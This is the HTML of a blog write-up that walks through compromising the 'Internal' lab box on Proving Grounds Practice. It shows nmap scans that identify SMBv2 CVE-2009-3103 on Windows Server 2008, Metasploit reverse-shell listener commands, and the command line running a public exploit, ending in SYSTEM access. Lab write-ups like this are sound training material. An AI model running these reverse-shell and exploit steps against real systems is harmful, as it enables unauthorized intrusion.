@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PG Practice - Internal | Fabio Birnegger</title>
+<meta name="keywords" content="Proving Grounds Practice, Windows, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Windows
+      
+  
+
+Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.40    
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 &#43;0200
+Nmap scan report for 192.168.237.40
+Host is up (0.036s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=internal
+| Not valid before: 2025-07-24T21:18:58
+|_Not valid after:  2026-01-23T21:18:58
+|_ssl-date: 2026-06-23T19:31:49&#43;00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: INTERNAL
+|   NetBIOS_Domain_Name: INTERNAL
+|   NetBIOS_Computer_Name: INTERNAL
+|   DNS_Domain_Name: internal
+|   DNS_Computer_Name: internal
+|   Product_Version: 6.0.6001
+|_  System_Time: 2026-06-23T19:31:41&#43;00:00
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+
+Host script results:
+| smb2-security-mode: 
+|   2.0.2: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-06-23T19:31:41
+|_  start_date: 2025-07-25T21:18:51
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)
+| smb-os-discovery: 
+|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: internal
+|   NetBIOS computer name: INTERNAL\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-06-23T12:31:41-07:00
+|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 142.74 seconds
+Proof
+The target is a Windows Server 2008 running SMBv2 as we can see in the port scan results. If we further enumerate this very old technology stack by running nmap SMB scripts against it, we can see that the target is vulnerable to CVE-2009-3103:">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/pg_internal/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/pg_internal/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/pg_internal/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="PG Practice - Internal">
+  <meta property="og:description" content="Box Details
+Difficulty Easy Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.40 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 &#43;0200Nmap scan report for 192.168.237.40Host is up (0.036s latency).Not shown: 65522 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.0.6001 (17714650)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ms-wbt-server Microsoft Terminal Service| ssl-cert: Subject: commonName=internal| Not valid before: 2025-07-24T21:18:58|_Not valid after: 2026-01-23T21:18:58|_ssl-date: 2026-06-23T19:31:49&#43;00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: INTERNAL| NetBIOS_Domain_Name: INTERNAL| NetBIOS_Computer_Name: INTERNAL| DNS_Domain_Name: internal| DNS_Computer_Name: internal| Product_Version: 6.0.6001|_ System_Time: 2026-06-23T19:31:41&#43;00:005357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.049152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPCService Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2Host script results:| smb2-security-mode: | 2.0.2: |_ Message signing enabled but not required| smb2-time: | date: 2026-06-23T19:31:41|_ start_date: 2025-07-25T21:18:51| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)| smb-os-discovery: | OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1| Computer name: internal| NetBIOS computer name: INTERNAL\x00| Workgroup: WORKGROUP\x00|_ System time: 2026-06-23T12:31:41-07:00|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 142.74 seconds Proof The target is a Windows Server 2008 running SMBv2 as we can see in the port scan results. If we further enumerate this very old technology stack by running nmap SMB scripts against it, we can see that the target is vulnerable to CVE-2009-3103:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-22T00:00:00+00:00">
+    <meta property="article:tag" content="Proving Grounds Practice">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/pg_internal/images/writeup_screens/pg_internal/pg_internal_cover.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/pg_internal/images/writeup_screens/pg_internal/pg_internal_cover.svg">
+  <meta name="twitter:title" content="PG Practice - Internal">
+  <meta name="twitter:description" content="Box Details
+Difficulty Easy Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.40 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 &#43;0200Nmap scan report for 192.168.237.40Host is up (0.036s latency).Not shown: 65522 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.0.6001 (17714650)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ms-wbt-server Microsoft Terminal Service| ssl-cert: Subject: commonName=internal| Not valid before: 2025-07-24T21:18:58|_Not valid after: 2026-01-23T21:18:58|_ssl-date: 2026-06-23T19:31:49&#43;00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: INTERNAL| NetBIOS_Domain_Name: INTERNAL| NetBIOS_Computer_Name: INTERNAL| DNS_Domain_Name: internal| DNS_Computer_Name: internal| Product_Version: 6.0.6001|_ System_Time: 2026-06-23T19:31:41&#43;00:005357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.049152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPCService Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2Host script results:| smb2-security-mode: | 2.0.2: |_ Message signing enabled but not required| smb2-time: | date: 2026-06-23T19:31:41|_ start_date: 2025-07-25T21:18:51| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)| smb-os-discovery: | OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1| Computer name: internal| NetBIOS computer name: INTERNAL\x00| Workgroup: WORKGROUP\x00|_ System time: 2026-06-23T12:31:41-07:00|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 142.74 seconds Proof The target is a Windows Server 2008 running SMBv2 as we can see in the port scan results. If we further enumerate this very old technology stack by running nmap SMB scripts against it, we can see that the target is vulnerable to CVE-2009-3103:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PG Practice - Internal",
+      "item": "http://localhost:1313/writeups/pg_internal/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PG Practice - Internal",
+  "name": "PG Practice - Internal",
+  "description": "Box Details\nDifficulty Easy Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.237.40 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 +0200\rNmap scan report for 192.168.237.40\rHost is up (0.036s latency).\rNot shown: 65522 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)\r| dns-nsid: |_ bind.version: Microsoft DNS 6.0.6001 (17714650)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\r3389/tcp open ms-wbt-server Microsoft Terminal Service\r| ssl-cert: Subject: commonName=internal\r| Not valid before: 2025-07-24T21:18:58\r|_Not valid after: 2026-01-23T21:18:58\r|_ssl-date: 2026-06-23T19:31:49+00:00; 0s from scanner time.\r| rdp-ntlm-info: | Target_Name: INTERNAL\r| NetBIOS_Domain_Name: INTERNAL\r| NetBIOS_Computer_Name: INTERNAL\r| DNS_Domain_Name: internal\r| DNS_Computer_Name: internal\r| Product_Version: 6.0.6001\r|_ System_Time: 2026-06-23T19:31:41+00:00\r5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Service Unavailable\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49156/tcp open msrpc Microsoft Windows RPC\r49157/tcp open msrpc Microsoft Windows RPC\r49158/tcp open msrpc Microsoft Windows RPC\rService Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2\rHost script results:\r| smb2-security-mode: | 2.0.2: |_ Message signing enabled but not required\r| smb2-time: | date: 2026-06-23T19:31:41\r|_ start_date: 2025-07-25T21:18:51\r| smb-security-mode: | account_used: guest\r| authentication_level: user\r| challenge_response: supported\r|_ message_signing: disabled (dangerous, but default)\r|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)\r| smb-os-discovery: | OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)\r| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1\r| Computer name: internal\r| NetBIOS computer name: INTERNAL\\x00\r| Workgroup: WORKGROUP\\x00\r|_ System time: 2026-06-23T12:31:41-07:00\r|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 142.74 seconds Proof The target is a Windows Server 2008 running SMBv2 as we can see in the port scan results. If we further enumerate this very old technology stack by running nmap SMB scripts against it, we can see that the target is vulnerable to CVE-2009-3103:\n",
+  "keywords": [
+    "Proving Grounds Practice", "Windows", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Easy Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.237.40 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 +0200\rNmap scan report for 192.168.237.40\rHost is up (0.036s latency).\rNot shown: 65522 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r53/tcp open domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)\r| dns-nsid: |_ bind.version: Microsoft DNS 6.0.6001 (17714650)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\r3389/tcp open ms-wbt-server Microsoft Terminal Service\r| ssl-cert: Subject: commonName=internal\r| Not valid before: 2025-07-24T21:18:58\r|_Not valid after: 2026-01-23T21:18:58\r|_ssl-date: 2026-06-23T19:31:49+00:00; 0s from scanner time.\r| rdp-ntlm-info: | Target_Name: INTERNAL\r| NetBIOS_Domain_Name: INTERNAL\r| NetBIOS_Computer_Name: INTERNAL\r| DNS_Domain_Name: internal\r| DNS_Computer_Name: internal\r| Product_Version: 6.0.6001\r|_ System_Time: 2026-06-23T19:31:41+00:00\r5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Service Unavailable\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49156/tcp open msrpc Microsoft Windows RPC\r49157/tcp open msrpc Microsoft Windows RPC\r49158/tcp open msrpc Microsoft Windows RPC\rService Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2\rHost script results:\r| smb2-security-mode: | 2.0.2: |_ Message signing enabled but not required\r| smb2-time: | date: 2026-06-23T19:31:41\r|_ start_date: 2025-07-25T21:18:51\r| smb-security-mode: | account_used: guest\r| authentication_level: user\r| challenge_response: supported\r|_ message_signing: disabled (dangerous, but default)\r|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: , NetBIOS MAC: 00:50:56:9e:45:ba (VMware)\r| smb-os-discovery: | OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)\r| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1\r| Computer name: internal\r| NetBIOS computer name: INTERNAL\\x00\r| Workgroup: WORKGROUP\\x00\r|_ System time: 2026-06-23T12:31:41-07:00\r|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 142.74 seconds Proof The target is a Windows Server 2008 running SMBv2 as we can see in the port scan results. If we further enumerate this very old technology stack by running nmap SMB scripts against it, we can see that the target is vulnerable to CVE-2009-3103:\n└─$ nmap --script \"smb*\" 192.168.237.40 -p 139,445\r.\r.\r.\r---SNIP---\r| smb-vuln-cve2009-3103: | VULNERABLE:\r| SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\r| State: VULNERABLE\r| IDs: CVE:CVE-2009-3103\r| Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\r| Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\r| denial of service (system crash) via an \u0026 (ampersand) character in a Process ID High header field in a NEGOTIATE\r| PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\r| aka \"SMBv2 Negotiation Vulnerability.\"\r| | Disclosure date: 2009-09-08\r| References:\r| http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\r|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\r---SNIP--- I exploited this by using this public exploit. Before running the exploit i started a listener in metasploit using the multi/handler module and configured it as follows:\nmsf \u003e use multi/handler\rmsf exploit(multi/handler) \u003e set payload windows/shell/reverse_tcp\rmsf exploit(multi/handler) \u003e set LHOST $TUN0_IP\rmsf exploit(multi/handler) \u003e set LPORT 4444\rmsf exploit(multi/handler) \u003e run I then ran the exploit in a separate terminal window:\n└─$ python3 exploit.py 192.168.118.40 192.168.45.159 4444 A non-staged payload like windows/x64/shell_reverse_tcp didn’t work so i had to use the staged payload windows/shell/reverse_tcp. (which is used by default in this exploit) To be able to receive a reverse shell with this payload I used the metasploit multi/handler module. This is because a simple netcat listener is unable to process these payloads.\nWith the SYSTEM user i was able to read C:\\Users\\Administrator\\Desktop\\proof.txt.\n",
+  "wordCount" : "622",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/pg_internal/images/writeup_screens/pg_internal/pg_internal_cover.svg","datePublished": "2026-06-22T00:00:00Z",
+  "dateModified": "2026-06-22T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/pg_internal/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PG Practice - Internal
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-22 00:00:00 +0000 UTC'>June 22, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_internal/pg_internal_cover.svg" alt="Cover">
+        
+</figure>
+  <div class="post-content md-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Windows</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap -sV -sC -p- 192.168.237.40    
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-23 21:29 +0200
+Nmap scan report for 192.168.237.40
+Host is up (0.036s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=internal
+| Not valid before: 2025-07-24T21:18:58
+|_Not valid after:  2026-01-23T21:18:58
+|_ssl-date: 2026-06-23T19:31:49+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: INTERNAL
+|   NetBIOS_Domain_Name: INTERNAL
+|   NetBIOS_Computer_Name: INTERNAL
+|   DNS_Domain_Name: internal
+|   DNS_Computer_Name: internal
+|   Product_Version: 6.0.6001
+|_  System_Time: 2026-06-23T19:31:41+00:00
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+
+Host script results:
+| smb2-security-mode: 
+|   2.0.2: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-06-23T19:31:41
+|_  start_date: 2025-07-25T21:18:51
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:9e:45:ba (VMware)
+| smb-os-discovery: 
+|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: internal
+|   NetBIOS computer name: INTERNAL\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-06-23T12:31:41-07:00
+|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 142.74 seconds
+</code></pre><h2 id="proof">Proof<a hidden class="anchor" aria-hidden="true" href="#proof">#</a></h2>
+<p>The target is a <strong>Windows Server 2008</strong> running <strong>SMBv2</strong> as we can see in the port scan results. If we further enumerate this very old technology stack by running <strong>nmap SMB scripts</strong> against it, we can see that the target is vulnerable to <strong>CVE-2009-3103</strong>:</p>
+<pre tabindex="0"><code>└─$ nmap --script &#34;smb*&#34; 192.168.237.40 -p 139,445
+.
+.
+.
+---SNIP---
+| smb-vuln-cve2009-3103: 
+|   VULNERABLE:
+|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2009-3103
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
+|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
+|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
+|           aka &#34;SMBv2 Negotiation Vulnerability.&#34;
+|           
+|     Disclosure date: 2009-09-08
+|     References:
+|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+---SNIP---
+</code></pre><p>I exploited this by using this <a href="https://github.com/Neved4/exploits/tree/main/CVE-2009-3103">public exploit</a>. Before running the exploit i started a listener in metasploit using the <em>multi/handler</em> module and configured it as follows:</p>
+<pre tabindex="0"><code>msf &gt; use multi/handler
+msf exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST $TUN0_IP
+msf exploit(multi/handler) &gt; set LPORT 4444
+msf exploit(multi/handler) &gt; run
+</code></pre><p>I then ran the exploit in a separate terminal window:</p>
+<pre tabindex="0"><code>└─$ python3 exploit.py 192.168.118.40 192.168.45.159 4444
+</code></pre><blockquote>
+<p>A non-staged payload like <em>windows/x64/shell_reverse_tcp</em> didn&rsquo;t work so i had to use the staged payload <em>windows/shell/reverse_tcp</em>. (which is used by default in this exploit) To be able to receive a reverse shell with this payload I used the metasploit <em>multi/handler</em> module. This is because a simple netcat listener is unable to process these payloads.</p>
+</blockquote>
+<p><img loading="lazy" src="/images/writeup_screens/pg_internal/pg_internal1.png"></p>
+<p>With the <em>SYSTEM</em> user i was able to read <em>C:\Users\Administrator\Desktop\proof.txt</em>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/proving-grounds-practice/">Proving Grounds Practice</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
